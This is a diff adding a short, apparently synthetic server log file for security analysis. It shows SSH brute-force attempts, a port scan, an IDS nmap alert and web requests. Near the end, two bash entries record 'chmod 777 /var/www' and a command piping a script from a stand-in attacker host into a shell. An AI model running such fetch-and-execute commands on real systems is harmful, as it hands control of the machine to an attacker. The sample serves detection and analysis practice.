@@ -1,0 +1,24 @@
+Nov 18 09:01:12 web-01 sshd[1021]: Accepted password for admin from 10.0.0.5 port 51234 ssh2
+Nov 18 09:03:44 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40022 ssh2
+Nov 18 09:03:46 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40023 ssh2
+Nov 18 09:03:48 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40024 ssh2
+Nov 18 09:03:50 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40025 ssh2
+Nov 18 09:03:52 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40026 ssh2
+Nov 18 09:03:54 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40027 ssh2
+Nov 18 09:05:10 web-01 sshd[1044]: Invalid user oracle from 198.51.100.7
+Nov 18 09:06:31 web-01 sshd[1052]: pam_unix(sshd:auth): authentication failure; user=admin rhost=192.0.2.50
+Nov 18 09:08:00 web-01 CRON[1100]: (root) CMD (/usr/local/bin/backup.sh)
+Nov 18 09:10:01 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=21
+Nov 18 09:10:01 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=22
+Nov 18 09:10:02 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=23
+Nov 18 09:10:02 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=25
+Nov 18 09:10:03 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=80
+Nov 18 09:10:03 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=443
+Nov 18 09:10:04 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=3389
+Nov 18 09:12:20 fw-01 kernel: IN=eth0 SRC=10.0.0.5 DST=10.0.0.10 PROTO=TCP DPT=443
+Nov 18 09:14:02 web-01 nginx: 10.0.0.5 "GET /index.html HTTP/1.1" 200 5120
+Nov 18 09:15:00 ids-01 snort: nmap scan detected from 203.0.113.9
+Nov 18 09:25:10 web-01 bash[1200]: chmod 777 /var/www
+Nov 18 09:26:03 web-01 bash[1200]: curl http://evil.example/x.sh | sh
+Nov 18 09:30:11 web-01 nginx: 10.0.0.7 "GET /about.html HTTP/1.1" 200 2048
+Nov 18 09:31:45 web-01 sshd[1260]: login failed for user bob from 192.0.2.50
